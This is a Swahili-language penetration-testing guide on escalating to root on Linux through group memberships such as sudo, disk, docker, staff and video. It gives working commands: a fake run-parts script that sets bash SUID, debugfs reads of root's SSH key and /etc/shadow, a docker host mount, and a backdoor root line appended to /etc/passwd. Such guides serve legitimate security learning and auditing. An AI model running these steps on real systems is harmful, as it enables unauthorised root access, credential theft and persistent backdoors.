# Vikundi Vinavyovutia - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vikundi vya Sudo/Admin

### **PE - Method 1**

**Wakati mwingine**, sera ya **/etc/sudoers** ya mfumo (au faili iliyojumuishwa kutoka humo) huwa na maingizo kama haya:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Hii inamaanisha kuwa mtumiaji yeyote anayelingana na mojawapo ya maingizo haya anaweza kutekeleza amri yoyote kama mtumiaji lengwa yeyote kupitia sudo (kwa kuzingatia sehemu nyingine za sera).<sup>[[3]](#references)</sup>

Ikiwa ndivyo, ili **kuwa root unaweza kutekeleza tu**:

```
sudo su
```

Ikiwa `sudo -l` inaruhusu matumizi yenye vikwazo ya `adduser` yanayohitaji jina la mtumiaji pekee, angalia kama inaunda kundi msingi lenye jina hilohilo ambalo bado halipo. Akaunti mpya katika kundi hilo inaweza kupata mapendeleo ikiwa sera inayotumika ya sudoers tayari inaruhusu `%group`; thibitisha tabia ya kuunda kundi na kanuni ya kundi kabla ya kuchukulia hili kama njia ya escalation. Kuunda akaunti hubadilisha mfumo, kwa hivyo kagua sera kwanza.

### PE - Method 2

Tafuta binary zote za suid na uangalie kama kuna binary ya **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Ikiwa **pkexec ni SUID binary**, inaweza kuendesha programu kama mtumiaji mwingine tu pale ambapo polkit imeidhinisha kitendo kilichoombwa; SUID bit pekee haihakikishi root. Kagua policy iliyosakinishwa na uidhinishaji wa session lengwa badala ya kudhani kuwa kuwa mwanachama wa **sudo** au **admin** kunatosha.<sup>[[4]](#references)[[5]](#references)</sup>

Kwa njia tofauti ya [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), hakikisha kwanza kwamba `pkexec` ni faili inayoweza kutekelezwa, inayomilikiwa na **root** na yenye SUID. Binary iliyosakinishwa bila bit hiyo si ongezeko la mamlaka la ndani la SUID lililoelezwa kwenye advisory. Namba ya toleo la upstream ni kidokezo tu: distributions zinaweza [kuweka fix kwenye matoleo ya zamani ya package](https://ubuntu.com/security/CVE-2021-4034), kwa hiyo kagua package ya vendor iliyosakinishwa na mitigations kabla ya kusema inaathirika.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) ni njia tofauti ya polkit: race ya uidhinishaji wa D-Bus, si hitilafu ya SUID ya `pkexec`. Kagua package ya polkit ya vendor iliyosakinishwa na kama action ya D-Bus yenye privileged inayoweza kufikiwa inaweza kufanya mabadiliko yenye manufaa; njia ya kuunda akaunti pia inahitaji service inayofaa kama AccountsService, na ufikiaji wa sudo wa kundi lolote jipya hutegemea policy ya sudo inayotumika. Toleo la polkit lililoripotiwa au service iliyosakinishwa pekee ni dalili tu, hasa pale ambapo vendors [huweka fixes kwenye matoleo ya zamani](https://access.redhat.com/security/cve/cve-2021-3560). Passive enumeration haipaswi kusababisha race hiyo.

Kwenye distributions ambazo bado zinatumia backend ya zamani ya Local Authority, kagua sheria zake za makundi kwa kutumia:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Majina ya makundi husika na mipangilio chaguomsingi hutofautiana kulingana na usambazaji; kundi linafaa hapa tu ikiwa sera ya ndani imelitajataja.<sup>[[5]](#references)</sup>

Ili **kuwa root unaweza kutekeleza**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Ukijaribu kutekeleza **pkexec** na kupata **hitilafu**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Katika session ya SSH isiyo na authentication agent iliyosajiliwa, `pkexec` inaweza kushindwa na kutoa hitilafu hii hata kama policy ingeruhusu kitendo hicho; polkit inaeleza `pkttyagent` kama text authentication agent ya sessions zisizo za desktop. Tabia halisi hutegemea version na distribution, kwa hiyo hakiki policy na usanidi wa agent wa mfumo husika. Workaround moja iliyoripotiwa kwa baadhi ya versions za NixOS hutumia **sessions 2 tofauti za SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL inayomnyima account moja ufikiaji wa `su` inasimamia executable hiyo, si kila njia ya kutekeleza kitendo kinachoruhusiwa kwa administrator. Ikiwa credential ya administrator imefichuka kwa njia nyingine, kagua kama kitendo tofauti, kama vile kuwasha system service ya muda kupitia `systemd-run`, kinaruhusiwa chini ya effective polkit policy; ni identity gani inayokubaliwa na authentication agent; na service itakayotokana na kitendo hicho itatumia identity gani. [Polkit distinguishes authentication as the session owner from an administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), while [systemd-run can request a transient service from the system manager](https://systemd.io/CONTROL_GROUP_INTERFACE/). Kuwepo kwa ingizo kwenye history, command iliyosakinishwa, au policy file inayosomeka pekee hakuthibitishi kuwa kitendo kimeidhinishwa au credential ni halali; ukaguzi usiofanya mabadiliko haupaswi kuwasilisha credentials au kuwasha unit.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Kikundi cha Wheel

Wakati mwingine sera ya sudoers inaweza pia kuwa na ingizo hili:

```
%wheel	ALL=(ALL:ALL) ALL
```

Hii inamaanisha kwamba mtumiaji yeyote anayelingana na entry hiyo anaweza kutumia `sudo` kutekeleza amri yoyote kama mtumiaji yeyote anayelengwa (kwa kuzingatia masharti mengine ya policy).<sup>[[3]](#references)</sup>

Ikiwa ndivyo, ili **kuwa root unaweza kutekeleza tu**:

```
sudo su
```

## Kundi la Shadow

Kwenye mifumo ambayo ruhusa zake zinaruhusu, watumiaji walio kwenye kundi la **shadow** wanaweza **kusoma** **/etc/shadow**; hakikisha hali halisi ya ruhusa na ACL kwenye mfumo lengwa:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Kwa hiyo, soma faili na ujaribu **kupasua baadhi ya hashes**.

Nuance ya haraka kuhusu hali ya kufungwa wakati wa kuchanganua hashes:
- Maingizo yenye `!` au `*` kwa ujumla hayaruhusu kuingia kwa nenosiri kupitia njia shirikishi.
- `!hash` inamaanisha nenosiri lilifungwa; vibambo vilivyosalia vinawakilisha sehemu ya nenosiri kabla halijafungwa.
- Sehemu yenye `*` si hash halali ya `crypt(3)` na huzuia kuingia kwa nenosiri la UNIX; usihitimishe kutokana nayo kama nenosiri liliwahi kuwekwa.
Hili ni muhimu kwa kuainisha akaunti hata pale kuingia moja kwa moja kunapozuiwa.<sup>[[6]](#references)</sup>

## Kikundi cha Staff

**staff**: Huruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za root (kumbuka kwamba executables zilizo kwenye `/usr/local/bin` zimo kwenye kigezo cha PATH cha mtumiaji yeyote, na zinaweza "kuchukua nafasi" ya executables zilizo kwenye `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi cha "adm", ambacho kinahusiana zaidi na ufuatiliaji/usalama.<sup>[[2]](#references)[[7]](#references)</sup>

Katika usanidi wa Debian ambapo `/usr/local/bin` hutangulia `/usr/bin` kwenye `PATH` (kama ilivyo kwenye mifano hapa chini), amri isiyo na njia kamili hutumia kwanza nakala iliyo kwenye `/usr/local/bin`; thibitisha `PATH` inayotumika kwenye mashine lengwa.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ikiwa mchakato wenye mapendeleo utatafuta amri isiyo na path kamili kupitia `/usr/local/bin` inayoweza kuandikika, kubadilisha amri hiyo kunaweza kuifanya iendeshwe kwa mapendeleo ya mchakato; thibitisha path halisi na kichocheo kabla ya kufanya majaribio.

Kwenye mifumo ya Ubuntu, `pam_motd` huendesha hati zinazotekelezeka kupitia `run-parts --lsbsysinit` kama root wakati wa kuingia; kazi za cron zinaweza pia kutumia `run-parts`, lakini hili hutegemea distro na usanidi.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Kwenye kuingia kwa SSH mpya, `pspy` inaweza kusaidia kuthibitisha kama njia hii inatumika kweli kwenye target; inaweza kuona mistari ya amri ya michakato bila root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Kikundi cha Disk

Uanachama katika kikundi cha **disk** unaweza kutoa ufikiaji wa moja kwa moja kwa vifaa vya block na mara nyingi huwa **karibu na ufikiaji wa root**; Debian inaeleza kuwa kwa kiasi kikubwa ni sawa na root, lakini hakikisha ruhusa halisi za kifaa na mpangilio wa hifadhi kwenye lengwa.<sup>[[7]](#references)</sup>

Njia za kawaida za vifaa ni pamoja na `/dev/sd*`, lakini NVMe na mipangilio mingine ya hifadhi hutumia majina tofauti.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` hufanya kazi kwenye mifumo ya faili ya ext2/ext3/ext4; njia kama `/root` na `/etc/shadow` zilizo hapo juu ni faili ndani ya mfumo wa faili uliofunguliwa, ilhali hoja ya pili ya `dump` ni njia ya matokeo kwenye mfumo asili wa faili.<sup>[[8]](#references)</sup> Kwa mfano, hii hutoa `/tmp/asd1.txt` kutoka kwenye mfumo wa faili uliofunguliwa na kuiweka kama `/tmp/asd2.txt` kwenye mfumo asili wa faili:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Chaguo la `-w` hufungua mfumo wa faili kwa usomaji na uandishi, na amri ya `write` hunakili faili asilia kwenye mfumo wa faili uliofunguliwa. Epuka kuitumia kwenye mfumo wa faili uliowekwa na unaotumika moja kwa moja, kwa sababu kuhariri moja kwa moja kunaweza kuharibu mfumo wa faili; inapowezekana, fanyia kazi picha ya diski iliyo nje ya mtandao.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

Kwa kutumia amri `w` unaweza kujua **nani ameingia kwenye mfumo**, na itaonyesha matokeo kama yafuatayo.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Ingizo la **tty1** hutambua koni pepe ya kwanza ya Linux; lenyewe halithibitishi kuwa mtumiaji yupo kimwili kwenye mashine, hasa kwenye containers au mazingira mengine.<sup>[[21]](#references)</sup>

Kwenye mifumo inayowasilisha kifaa cha framebuffer kinachoweza kusomeka, kuwa mwanachama wa kundi la **video** kunaweza kutoa ufikiaji wa kifaa hicho. Kiolesura cha Linux framebuffer kinaeleza `/dev/fb0` kama kifaa cha kumbukumbu kinachoweza kusomeka na kunakiliwa ili kupata picha ya skrini; njia ya `/sys/class/graphics/fb0/virtual_size` inapatikana tu pale sifa hiyo ya fbdev sysfs inapokuwepo, kwa hiyo kagua mfumo lengwa kwanza.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Ikiwa toleo lililosakinishwa la **GIMP** lina raw-data importer, fungua **`screen.raw`** kwa kutumia importer hiyo; usaidizi na vidhibiti hutofautiana kulingana na toleo na plug-in.<sup>[[22]](#references)</sup>

![Kundi la Disk - Kundi la Video: Ili kufungua picha ghafi, unaweza kutumia GIMP, kuchagua faili ya screen.raw na kuchagua Raw image data kama aina ya faili](<../../../images/image (463).png>)

Weka Upana na Urefu wa picha ili vilingane na vipimo vya framebuffer; jaribu fomati za pikseli/Aina za Picha zinazopatikana hadi matokeo yasomeke vizuri.<sup>[[9]](#references)</sup>

![Kundi la Disk - Kundi la Video: Kisha badilisha Upana na Urefu viendane na vinavyotumiwa kwenye skrini na ujaribu Aina tofauti za Picha (kisha uchague inayoonyesha skrini vizuri zaidi)](<../../../images/image (317).png>)

## Kundi la Root

Kuwa mwanachama wa kundi la **root** hakukupi UID ya root, lakini faili zinazoweza kuandikwa na kundi na zinazomilikiwa na `root` bado zinaweza kuvutia ikiwa huduma au maktaba zilizo na mapendeleo huzitumia. Hakiki ruhusa halisi za faili na jinsi zinavyotumiwa kabla ya kuzichukulia kama njia ya privilege escalation.

**Angalia faili ambazo wanachama wa root wanaweza kurekebisha**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Uanachama katika kundi la `docker` hutoa ufikiaji wa kiwango cha root kwa Docker daemon kwenye usakinishaji wa kawaida wa rootful. Kwa kuwa bind mounts zina ruhusa ya kusoma na kuandika kwa chaguomsingi, mtumiaji anayeweza kudhibiti daemon hiyo anaweza kuweka `/` ya host ndani ya container na kubadilisha faili za host; jambo hili kwa vitendo humpa mtumiaji root kwenye host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Uanachama wa kundi huenda usilingane kati ya `/etc/group`, `/etc/gshadow`, na token ya mchakato wa sasa. Ikiwa mtumiaji hayupo kwenye `id -nG` lakini `newgrp docker` inafaulu, angalia kundi linaloonyeshwa na `id` kwenye shell mpya na ujaribu kama Docker socket inaweza kuandikiwa kweli na inaendesha daemon ya rootful. Jina la kundi pekee halithibitishi udhibiti wa host. Weka muda wa juu kwa uchunguzi wowote wa kiotomatiki wa `newgrp` ili kidokezo cha nenosiri kisikwamishe uorodheshaji.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Hatimaye, ikiwa hupendi mapendekezo yoyote yaliyotangulia, au hayafanyi kazi kwa sababu fulani (firewall ya docker API?), unaweza kujaribu **kuendesha container yenye ruhusa za juu na kutoroka kutoka humo** kama ilivyoelezwa hapa:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ikiwa una ruhusa za kuandika kwenye docker socket, soma [**chapisho hili kuhusu jinsi ya kuongeza privilege kwa kutumia vibaya docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

Kwa kawaida **wanachama** wa kundi la **`adm`** wana ruhusa ya **kusoma faili za log** zilizo ndani ya _/var/log/_.\
Kwa hiyo, ikiwa umedukua akaunti ya mtumiaji aliye katika kundi hili, hakikisha **unachunguza log**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Makundi haya yana maana zinazotegemea huduma na distro. Debian inaeleza `backup` kwa ajili ya kukabidhi kazi za kuhifadhi/kurejesha nakala, `lp` kwa daemon za printer, na `mail` kwa `/var/mail`; kwa hiyo, kagua ruhusa za mfumo husika kabla ya kuchukulia uanachama kama njia ya kupata privilege.<sup>[[7]](#references)</sup>

Mara nyingi huwa **njia za kugundua credentials** badala ya njia za moja kwa moja za kupata root:
- **backup**: huenda ikafichua archives zenye configs, keys, DB dumps, au tokens.
- **operator**: ufikiaji wa uendeshaji unaotegemea platform, unaoweza kuvuja data nyeti ya wakati wa utekelezaji.
- **lp**: print queues/spools zinaweza kuwa na maudhui ya nyaraka.
- **mail**: mail spools zinaweza kufichua reset links, OTPs, na credentials za ndani.

Chukulia uanachama katika makundi haya kuwa ni ugunduzi wa ufichuaji wa data wenye thamani kubwa, kisha endelea kwa kuchunguza matumizi tena ya password/token.

## Auth group

Kwenye OpenBSD, S/Key ikiwa imesanidiwa, `/etc/skey` inamilikiwa na `root:auth` na kufikia rekodi zake kunahitaji kuwa katika kundi la `auth`; rekodi za YubiKey huhifadhiwa kwenye `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Usanidi hatarishi wa OpenBSD 6.6 uliokuwa na S/Key au YubiKey umewezeshwa uliwawezesha watumiaji wa ndani wenye privilege za `auth` kupata root; Qualys inaeleza sharti la awali na mfuatano wa exploit, na PoC iliyounganishwa inatekeleza hilo.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Uthibitishaji wa pkexec/pkttyagent bila GUI session (suala la NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Wiki ya Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Kurasa za mwongozo za Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Mwongozo wa Marejeo wa polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Mwongozo wa Marejeo wa polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Mwongozo wa Kulinda Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Ukurasa wa mwongozo wa Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Kifaa cha Frame Buffer — Nyaraka za Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Kurasa za mwongozo za Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Kurasa za mwongozo za Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — kuchunguza michakato ya Linux bila privilege](https://github.com/DominicBreuker/pspy)
- [13] [Usalama wa Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Kusimamia Docker kama mtumiaji asiye root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Kuendesha containers — Nyaraka za Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Kurasa za mwongozo za OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Kurasa za mwongozo za OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Athari za kiusalama katika uthibitishaji wa OpenBSD — Ushauri wa Usalama wa Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC ya local exploit](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Vifaa vilivyotengewa Linux (toleo la 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Kuingiza na Kuhamisha Picha — Nyaraka za GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
